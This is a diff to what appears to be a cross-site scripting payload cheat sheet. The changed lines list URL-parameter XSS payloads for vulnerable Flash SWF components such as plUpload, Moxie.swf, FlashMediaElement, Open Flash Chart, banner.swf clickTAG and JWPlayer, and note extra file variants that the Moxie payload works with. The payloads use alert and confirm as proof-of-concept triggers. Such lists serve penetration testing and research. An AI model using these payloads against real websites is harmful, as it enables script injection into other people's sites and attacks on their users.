@@ -116,7 +116,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 - plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`
 
-- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS`
+- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)
 
 - FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>
 
@@ -128,7 +128,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 - Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`
 
-- Banner.swf (unknown): `banner.swf?clickTAG=javascript:alert(document.domain);//`
+- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`
 
 - JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`
 
